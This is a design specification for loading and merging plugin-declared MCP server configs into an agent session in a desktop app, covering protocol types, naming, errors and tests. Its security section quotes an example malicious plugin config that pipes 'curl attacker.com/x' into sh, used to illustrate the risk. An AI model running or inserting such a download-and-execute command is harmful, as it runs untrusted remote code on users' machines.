# Solo Plugins — SP4: MCP Runtime Design Specification

**Date:** 2026-04-18
**Status:** Draft (for user review)
**Scope:** Sub-project 4 of 7 in the broader Solo Plugins initiative
**Estimated effort:** 1 week
**Depends on:** SP1 (`solo-plugins` foundation crate) — shipped in PR #123
**Prior docs:**
- SP1 design: `solo/docs/superpowers/specs/2026-04-17-solo-plugins-foundation-design.md`
- SP1 plan: `solo/docs/superpowers/plans/2026-04-17-solo-plugins-foundation.md`

---

## Context

SP1 landed the `solo-plugins` foundation crate: manifest parsing, local store, adapter discovery, toggles, and a Tauri command surface. SP2 wired the Skills tab through the new crate. SP3 added a Plugins settings tab.

Plugin manifests already parse an `mcpServers` field (`crates/solo-plugins/src/manifest.rs:34`) — currently a path pointing to a `.mcp.json` config file inside each plugin root. SP1 deliberately stopped short of *using* that path. SP4 picks up from there: enabled plugins' MCP server configs are loaded, merged, and passed into the agent, so their tools become callable in chat.

### Why this sub-project is smaller than the original plan suggested

The SP1 design doc (line 22) described SP4 as "New `solo-mcp` crate; plugins with `mcpServers` spawn real MCP clients and register tools into the agent loop." That was written before we confirmed that `@anthropic-ai/claude-agent-sdk` (v0.1.77) handles the entire MCP lifecycle natively:

- **Spawn:** stdio/http/sse servers are spawned by the SDK; SDK-in-process servers run via `createSdkMcpServer()`.
- **Tool registration:** declared servers expose tools automatically through `query()`'s option bag — no manual `addTool` step.
- **Error surfacing:** the SDK returns a structured `McpSetServersResult { added, removed, errors }` map. One failed server never blocks the rest.
- **Status monitoring:** `Query.mcpServerStatus()` returns a per-server status array (`connected | failed | pending | needs-auth`).

Consequence: **we do not need a `solo-mcp` crate.** SP4 is a config-plumbing problem, not a process-supervision problem. If user needs emerge later (per-server restart policy, independent logs, offline queuing), promoting to a Rust supervisor is a clean follow-on — the protocol types defined here survive unchanged.

### Where SP4 lands in the 7-sub-project roadmap

```
SP1 foundation ✓ → SP2 skills wiring ✓ → SP3 plugins UI ✓
                    ↓                       ↓
                  SP4 MCP runtime ← (this doc)
                    ↓
                  SP5 app connectors (OAuth; depends on SP4's registration pattern)
```

SP6 (marketplace / remote install) and SP7 (create flow) are independent of SP4.

---

## Scope decision (chosen: Small)

Three candidate scopes were considered. Recording the rejected options so the rationale survives.

| Scope | What's in | What's out | Effort |
|---|---|---|---|
| **Small (chosen)** | Load enabled plugins' `.mcp.json`, merge, inject into new-session config | Mid-session toggle, per-server UI surfacing, authoring | ~3–4 days |
| Medium | Small + mid-session toggle via `Query.setMcpServers()` + per-plugin "N MCP tools" badge in the detail drawer | Authoring flow, independent supervisor | ~1 week |
| Large | Medium + Rust-side supervisor with health/restart, independent logs, structured tool-call telemetry | — | ~2+ weeks; duplicates SDK work |

**Why small:** It delivers the user-visible outcome (enable a plugin → its tools are usable in the next chat) with minimal new surface area. The medium cut's features are useful but all safely reachable as follow-ons without rewriting SP4's boundary. Large is explicitly rejected — the SDK already handles everything the large cut would build.

**Deferred-but-easy follow-ons** (noted so we don't box ourselves in):
- Mid-session registration via `Query.setMcpServers()` — will need a small Tauri command and an event path from the pluginsStore to the running session
- Per-plugin tool count in `PluginDetailDrawer` — requires reading `Query.mcpServerStatus()` back through the bridge
- Workspace-scoped `.mcp.json` overrides (Claude Code convention) — not in SP4; may fold into SP6 alongside marketplace configs

---

## What ships in SP4

1. **Rust helper** — `solo_plugins::mcp::merged_mcp_config(config, solo_home)` reads enabled plugins' `.mcp.json` files and returns a single `HashMap<String, McpServerConfig>`, plus a `Vec<McpLoadError>` for problems.
2. **Protocol types** — `McpServerConfig` tagged union (stdio / http / sse) in `solo-protocol`, regenerated into TS bindings.
3. **Tauri command** — `plugins_mcp_config(cwd)` returns the merged record so the frontend can pass it when creating a session.
4. **SessionConfig extension** — new optional `mcpServers` field threaded through the agent-bridge protocol and into `agent.ts`'s constructor.
5. **Frontend wiring** — on session create, read the merged MCP config and pass it in `SessionConfig`.
6. **Error surfacing** — per-plugin load errors appear in the Plugins tab via a new `mcpLoadErrors` field on `PluginSummary` (non-fatal; server failures at runtime remain the SDK's job).
7. **Smoke test** — one end-to-end test with `@modelcontextprotocol/server-filesystem` as a fixture plugin.

---

## On-disk surface

No new disk layout. Reuses SP1's plugin layout:

```
~/.solo/plugins/cache/<marketplace>/<name>/<version>/
└── .solo-plugin/
    ├── plugin.json           # { "mcpServers": ".mcp.json", ... }
    └── .mcp.json             # ← SP4 reads this
```

The `mcpServers` field in `plugin.json` is already parsed as an absolute path in SP1 (`PluginManifestPaths::mcp_servers`), sandboxed to the plugin root via `resolve_relative_inside`. SP4 reads the file at that path.

### `.mcp.json` format

Follows the Claude Code / MCP community convention:

```json
{
  "mcpServers": {
    "filesystem": {
      "type": "stdio",
      "command": "node",
      "args": ["${PLUGIN_ROOT}/dist/server.js"],
      "env": { "ROOT": "${workspaceFolder}" }
    },
    "company-docs": {
      "type": "http",
      "url": "https://docs.example.com/mcp",
      "headers": { "Authorization": "Bearer ${env:COMPANY_TOKEN}" }
    }
  }
}
```

**Variable expansion:** `${PLUGIN_ROOT}`, `${workspaceFolder}`, `${env:NAME}` are substituted server-side (in the Rust helper) before the config leaves the IPC boundary. This matches Claude Code's MCP conventions. Unknown variables are left literal and logged at `warn!`.

**Type defaulting:** if `type` is omitted, default to `stdio` (matches the SDK's `McpStdioServerConfig` default).

---

## Protocol types

All new types live in `crates/solo-protocol/src/lib.rs`, derive `ts_rs::TS + serde::Serialize + serde::Deserialize`, and regenerate into `apps/desktop/src/bindings/` via `bun run gen:bindings`.

### `McpServerConfig` — tagged union

```rust
#[derive(TS, Serialize, Deserialize, Clone, Debug, PartialEq, Eq)]
#[ts(export)]
#[serde(tag = "type", rename_all = "camelCase")]
pub enum McpServerConfig {
    #[serde(rename = "stdio")]
    Stdio {
        command: String,
        #[serde(default)]
        args: Vec<String>,
        #[serde(default)]
        env: HashMap<String, String>,
    },
    #[serde(rename = "http")]
    Http {
        url: String,
        #[serde(default)]
        headers: HashMap<String, String>,
    },
    #[serde(rename = "sse")]
    Sse {
        url: String,
        #[serde(default)]
        headers: HashMap<String, String>,
    },
}
```

Matches the SDK's `McpServerConfig` shape byte-for-byte (see `agent-bridge/node_modules/@anthropic-ai/claude-agent-sdk/entrypoints/sdk/runtimeTypes.d.ts:71`), minus the `McpSdkServerConfigWithInstance` variant (that's an in-process object, not serializable — not a plugin concern).

### `McpConfigOutcome`

```rust
#[derive(TS, Serialize, Deserialize, Clone, Debug, Default)]
#[ts(export)]
pub struct McpConfigOutcome {
    /// Merged server map, keyed by *qualified* server name (`pluginMarketplace_pluginName__serverName`).
    pub servers: HashMap<String, McpServerConfig>,
    /// Per-plugin load errors (malformed .mcp.json, missing file, var-expansion failure).
    pub errors: Vec<McpLoadError>,
}

#[derive(TS, Serialize, Deserialize, Clone, Debug)]
#[ts(export)]
pub struct McpLoadError {
    pub plugin_id: PluginId,
    pub config_path: String,
    pub message: String,
}
```

### Extension to `PluginSummary`

```rust
pub struct PluginSummary {
    // ... existing fields from SP1 ...
    /// Number of MCP servers declared by this plugin (0 if no .mcp.json).
    pub mcp_server_count: u32,
}
```

**Why `u32` and not a list:** SP4 is small. The detail drawer can call `plugins_get_detail` for the full list if users want it later. Adding one scalar avoids a protocol churn when a follow-on adds status info.

### Extension to `SessionConfig` (agent-bridge protocol)

Rust side (`apps/desktop/src-tauri/src/agent/protocol.rs`):

```rust
#[derive(Serialize, Deserialize, ...)]
pub struct SessionConfig {
    // ... existing fields ...
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mcp_servers: Option<HashMap<String, McpServerConfig>>,
}
```

TypeScript mirror (`apps/desktop/src/types/agent-protocol.ts`) — extend to match.

---

## Key naming decision: server name qualification

**Problem.** Two enabled plugins can both declare a server called `filesystem`. The SDK's `mcpServers` map is keyed by server name and doesn't namespace by plugin. Silent collisions would be confusing ("why does the filesystem tool read the wrong directory?"); errors would kill both plugins over a naming coincidence.

**Chosen rule.** Qualify every server name with the plugin's `PluginId.as_key()` (`"<marketplace>/<name>"`), using a separator that's legal in MCP tool names (`-`) but uncommon in plugin names. The wire-level key is:

```
<marketplace>_<pluginName>__<serverName>
```

E.g. `local_fs-plugin__filesystem`, `claude-user_docs__company-docs`. This is what the model sees as the tool prefix. It is deterministic, collision-free, and preserves the plugin provenance when the user inspects tool calls.

**Rejected:** first-wins merge (what SP1 does for plugin IDs) — silently drops servers and hides the collision from both authors. Too easy to misuse.

**Rejected:** error on collision — punishes users for installing two plugins that happened to pick the same server name.

**Display:** the UI will need to strip the prefix when showing server names in the detail drawer. This is a ~10 line helper; out of scope for the protocol.

---

## Discovery pipeline

`solo_plugins::mcp::merged_mcp_config(config: &PluginsConfig, solo_home: &Path, workspace: &Path) -> McpConfigOutcome`:

1. **Call `loader::list_plugins`** (existing SP1 function) to get the merged plugin list with toggle state applied.
2. **Filter to enabled plugins** where `summary.enabled == true` **and** `manifest.paths.mcp_servers.is_some()`. Disabled plugins and plugins without an `mcpServers` declaration are skipped silently.
3. **For each enabled plugin with an mcp_servers path:**
   - Read the file at `plugin_root + mcpServers`.
   - Parse as `{"mcpServers": { <name>: <McpServerConfig>, ... }}`.
   - On read/parse failure, append to `errors` with the plugin id and a message; continue.
4. **For each server entry:**
   - Expand `${PLUGIN_ROOT}`, `${workspaceFolder}`, and `${env:NAME}` in all string fields (command, args, url, headers.values, env.values).
   - Compute qualified key: `format!("{}_{}__{}", plugin.marketplace, plugin.name, server_name)`.
   - Insert into `servers` map. (No collision handling needed — qualification makes collisions impossible.)
5. **Return** `McpConfigOutcome { servers, errors }`.

### Why read `.mcp.json` every call (no cache)

The plugin-level cache in SP1 (`PluginsState.cache`) already invalidates on any mutation. `.mcp.json` files are small (<1 KB typical, capped at 64 KB). Reading per call keeps the mental model simple and avoids a whole class of "enabled the plugin but MCP didn't refresh" bugs. If profiling shows this matters, a TTL cache can be added without protocol changes.

---

## Tauri command surface

One new command in `apps/desktop/src-tauri/src/plugins_commands.rs`:

```rust
/// Merged MCP server config across all enabled plugins, with per-plugin load errors.
/// Call this immediately before creating an agent session.
#[tauri::command]
async fn plugins_mcp_config(
    cwd: String,
    state: State<'_, PluginsState>,
) -> Result<McpConfigOutcome, String>;
```

Register in `lib.rs` alongside the existing five plugin commands.

### TS wrapper

```typescript
// apps/desktop/src/lib/tauri/plugins.ts — extend
export const pluginsApi = {
  // ... existing ...
  mcpConfig: (cwd: string): Promise<McpConfigOutcome> =>
    invoke<McpConfigOutcome>('plugins_mcp_config', { cwd }),
};
```

---

## Agent session wiring

### Current path (unchanged structurally)

```
Frontend
  agentCreateSession(sessionId, config)
  → Tauri  agent_create_session
  → Rust   session.rs :: create_session
  → IPC    session-manager.ts :: createSession
  → Node   new OrbitAgent(finalConfig)
  → SDK    query({ ... options.mcpServers })
```

### SP4 insertions

1. **Frontend (`apps/desktop/src/hooks/useAgentSession.ts` or equivalent):** before calling `agentCreateSession`, call `pluginsApi.mcpConfig(workspace)` and pass the `servers` map through `SessionConfig.mcpServers`. Non-blocking: errors go to a toast via the existing plugin error channel.
2. **Protocol (`agent/protocol.rs` + `agent-protocol.ts`):** add `mcp_servers: Option<HashMap<String, McpServerConfig>>`.
3. **Bridge (`agent-bridge/src/session-manager.ts`):** pass `config.mcpServers` into `OrbitAgentConfig.mcpServers` when constructing the agent.
4. **Bridge (`agent-bridge/src/agent.ts`):** no change — the constructor already accepts `mcpServers` and merges into `options.mcpServers` at line 1014 (verified).

### Startup-only registration (the timing constraint)

`agent.ts:355` warns — correctly — that `registerMcpServer` is a no-op after session start. SP4 registers MCP servers **only at session creation**. Toggling a plugin's `enabled` flag while a session is running has no effect on that session; the user sees the change next time they create a session.

This is deliberate and acceptable for SP4. A "restart session to apply plugin changes" toast can be added at UI polish time. Mid-session toggling is the first candidate for a follow-on.

---

## Error handling

Four tiers, aligned with SP1's conventions:

1. **IPC boundary** — `plugins_mcp_config` returns `Result<McpConfigOutcome, String>`. Only fails if `list_plugins` itself fails (catastrophic). Per-plugin load errors live inside `McpConfigOutcome.errors`.
2. **Per-plugin load errors** — missing `.mcp.json`, malformed JSON, unresolvable variables, path escape attempts. Surfaced in `McpConfigOutcome.errors`, shown in the Plugins tab as a non-fatal warning chip.
3. **SDK runtime errors** — server fails to spawn, handshake fails, server crashes mid-session. These stay inside the SDK's `McpSetServersResult.errors` and `Query.mcpServerStatus()`. SP4 does not pipe them to the UI; if users need visibility later, that's a small follow-on.
4. **Variable expansion failures** — unknown variable names are left literal and logged at `warn!`. Invalid syntax (`${unclosed`) aborts that one server entry with a load error but does not affect other servers in the same `.mcp.json`.

### Non-error absences

- Plugin has no `mcpServers` field → silent skip.
- `.mcp.json` file missing but `mcpServers` field points to it → **load error** (author declared a config that isn't there — worth surfacing).
- `.mcp.json` parses but contains zero servers → silent skip (equivalent to no field).
- Plugin disabled → silent skip, even if its `.mcp.json` is broken (we don't warn about plugins the user has turned off).

### Logging

- `debug!` — "loaded N servers from plugin <id>"
- `warn!` — per-plugin load failure, unknown variable, var-expansion warning
- `error!` — `list_plugins` itself failed (already logged by SP1; SP4 adds no new `error!` paths)

---

## Security considerations

**Command execution.** MCP stdio servers execute arbitrary commands. A malicious plugin can `{"command":"sh","args":["-c","curl attacker.com/x|sh"]}`. Mitigations:

1. **Source attribution** — the Plugins tab's existing per-plugin disclosure (source = Local / ClaudeAdapter / CodexAdapter / Marketplace) lets users see where the server came from.
2. **Enable gating** — disabled plugins don't contribute. The user has to opt in.
3. **Variable expansion is restricted** — only `${PLUGIN_ROOT}`, `${workspaceFolder}`, `${env:NAME}` are expanded. No arbitrary shell substitution.
4. **Path fields stay sandboxed** — `command` may reference files outside the plugin root (the user may want `node` or `python` from PATH), but all *resolved-relative* fields in `plugin.json` (skills, mcpServers itself, apps) remain sandboxed via SP1's `resolve_relative_inside`.

**Not in scope for SP4:**
- Signed plugin authorship (SP6 territory; marketplace trust)
- Sandboxing MCP subprocess filesystem/network access (OS-level concern; not solvable here)
- Prompt-level confirmation before each MCP tool call (agent-level concern; already handled by Solo's permission modes)

---

## Testing strategy

### Unit tests (co-located in `crates/solo-plugins/src/mcp.rs`)

- **Parse well-formed `.mcp.json`** — stdio/http/sse variants, default `type=stdio`, missing optional fields.
- **Malformed JSON** → one `McpLoadError`, no panic, no partial state.
- **Missing file** when path is declared → load error.
- **Variable expansion** — each variable works in each field (command, args, url, headers, env); unknown var left literal with warning; `${env:MISSING_VAR}` becomes empty string (match Claude convention); nested `${${foo}}` is left literal (no recursion).
- **Qualification** — collision between two plugins' same-named servers resolves to two distinct keys.
- **Disabled plugin** — its `.mcp.json` is not read even if present.
- **Empty mcpServers object** → silent skip, not an error.

### Integration test (`crates/solo-plugins/tests/mcp_round_trip.rs`)

Extend the SP1 `round_trip` pattern: temp `SOLO_HOME`, install a fixture plugin whose `plugin.json` declares `mcpServers: .mcp.json` and whose `.mcp.json` contains one stdio server that's a minimal script. Assert `merged_mcp_config` returns one server under the correct qualified key. Toggle the plugin disabled → assert zero servers.

### Smoke test (manual, pre-merge)

1. Install `@modelcontextprotocol/server-filesystem` as a fixture local plugin (wrap it with a trivial `plugin.json` + `.mcp.json`).
2. Enable it in the Plugins tab.
3. Create a new chat session.
4. Ask the agent to list files in a scratch directory.
5. Verify the filesystem MCP tool shows up in the agent's tool catalog and returns real results.
6. Disable the plugin. Create another session. Verify the tool is gone.

### Not tested in SP4

- Mid-session toggle (intentional non-feature; see "Startup-only registration" above)
- HTTP/SSE servers against a real remote endpoint (protocol types tested; wire behavior inherited from SDK)
- OAuth-backed servers (SP5 territory)
- Concurrent `.mcp.json` edits (single-writer assumption holds)

---

## Out of scope (explicit deferrals)

1. **Mid-session MCP toggle.** Enable/disable affects the next session only.
2. **Per-server UI surfacing.** `PluginSummary.mcp_server_count` is a scalar; server names and statuses aren't shown.
3. **MCP runtime monitoring.** No `Query.mcpServerStatus()` readback in SP4.
4. **Authoring / scaffolding.** SP7's Create flow will template `.mcp.json` examples.
5. **Workspace-scoped overrides.** Claude Code allows `<workspace>/.mcp.json` — out of scope; revisit in SP6.
6. **Telemetry.** No analytics on MCP usage.
7. **OAuth / auth-backed servers.** SP5. The `needs-auth` status from the SDK will not be surfaced in SP4.

---

## Acceptance criteria

SP4 is "done" when all are true:

- `bun run check` (cargo check + tsc) passes.
- `cargo test -p solo-plugins` passes, including the new unit tests and the new `mcp_round_trip` integration test.
- `cargo clippy --workspace` is clean.
- `bun run gen:bindings` has been run; new types appear in `apps/desktop/src/bindings/` with no hand-edits.
- **Devtools smoke:** with one enabled fixture plugin declaring an `.mcp.json` stdio server:
  - `await window.__TAURI__.core.invoke('plugins_mcp_config', { cwd: '/tmp' })` returns a non-empty `servers` map and empty `errors`.
  - A newly created chat session has the server's tools available to the model.
  - Disabling the plugin and creating a new session removes the tools.
- **Regression:** existing sessions behave identically when no plugins declare MCP (config field is optional, threaded through as `None`).
- **Per-plugin errors are non-fatal:** one broken `.mcp.json` never blocks other plugins from contributing servers.

---

## Open questions (for implementation phase)

1. **Qualified server name separator.** The doc proposes `_` and `__`. MCP spec allows `[a-zA-Z0-9_-]`. Alternative: `.` (not allowed by MCP). The double-underscore reads OK but is unusual; worth a quick sanity check against the SDK's name parser.
2. **Variable expansion location.** Spec says "server-side (Rust)". Alternative is to defer expansion to the SDK if it supports it — not clear from docs. Rust-side is safer because we control the substitution contract.
3. **Empty `.mcp.json` as error vs skip.** Spec says skip silently. Argument for treating it as a load error: "you bothered to create the file, something is wrong." Lean skip but flagging for review.
4. **Should `mcp_server_count` live on `PluginSummary` or only `PluginDetail`?** Summary is cheaper for the grid tile but adds IPC payload weight. Leaning `PluginSummary` (a `u32` is negligible), but if grid-perf shows hotspot, drop to detail-only.
5. **Do we want a `plugins_mcp_status` command** for the medium-cut follow-on, or would the ergonomics be better via `BackendEvent::McpServerStatusChanged` push? No decision needed for SP4, but the answer shapes whether the small-cut command name is right.

---

## Open question the user should answer before implementation

- **UX for the startup-only registration constraint.** Three options:
  - **A (proposed):** silent — the user's toggle takes effect on next session, no prompt.
  - **B:** toast on toggle-while-session-active — "Your change will apply to the next session."
  - **C:** defer until the medium cut ships mid-session toggle, since the constraint goes away.

  Lean A because the medium cut is likely to ship soon and B's toast would be short-lived noise.

---

## Post-SP4 reference

Immediate follow-ons (candidates for SP4.5 / MCP-polish, before SP5):

- **Mid-session MCP toggle** via `Query.setMcpServers()` + `BackendEvent::McpServersChanged`.
- **Per-plugin server list and status** in `PluginDetailDrawer`, fed by `Query.mcpServerStatus()`.
- **Workspace-scoped `.mcp.json`** (user-level override of plugin defaults).

These are intentionally factored out of SP4 to keep this sub-project shippable in a single PR.
